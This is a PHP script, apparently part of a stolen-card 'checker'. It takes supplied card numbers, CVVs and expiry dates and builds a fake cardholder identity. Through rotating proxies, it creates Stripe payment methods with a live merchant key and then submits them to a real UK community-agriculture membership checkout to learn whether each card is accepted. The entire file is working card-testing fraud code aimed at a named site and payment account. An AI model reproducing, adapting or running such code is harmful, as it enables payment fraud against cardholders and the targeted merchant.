<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$data = 'type=card&billing_details[address][line1]=12+main+street&billing_details[address][line2]=&billing_details[address][city]=Brewster&billing_details[address][state]=New+York&billing_details[address][postal_code]=10509&billing_details[address][country]=US&billing_details[name]='.$fake->first.'+'.$fake->last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F992b3357b%3B+stripe-js-v3%2F992b3357b&time_on_page='.rand(50000, 100000).'&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_15qOWhJdS3wQSE0x';

$r1 = $this->curlx->Post('https://api.stripe.com/v1/payment_methods', $data, null, null, $server['proxy']);

if (!$r1->success) goto start;

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$status = $this->response->ErrorHandler($json_r1->error);

	goto end;
}

$pm = $json_r1->id;
$CardType = $json_r1->card->brand;

$data = 'level=1&checkjavascript=1&username='.$fake->user.'&password=yCJxa3imG3FwqsA&password2=yCJxa3imG3FwqsA&bfirstname='.$fake->first.'&blastname='.$fake->last.'&baddress1=12+main+street&baddress2=&bcity=Brewster&bstate=New+York&bzipcode=10509&bcountry=US&bphone=2564567654&bemail='.urlencode($fake->email).'&bconfirmemail='.urlencode($fake->email).'&fullname=&CardType='.$CardType.'&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id='.$pm.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mm.'&ExpirationYear='.$yyyy;

$r2 = $this->curlx->Post('https://communitysupportedagriculture.org.uk/membership-account/membership-checkout/', $data, null, null, $server['proxy']);

if (!$r2->success) goto start;

$err = trim(strip_tags(str_replace(['Error updating default payment method.', 'Error creating customer record with Stripe:'], '', $this->getstr($this->getstr($r2->body, 'class="pmpro_message', '/'), '>', '<'))));

if (empty($err)) file_put_contents('stu_r2_err.txt', $r2->body . PHP_EOL, FILE_APPEND);

$status = $this->response->Stripe($r2->body, $err);

end: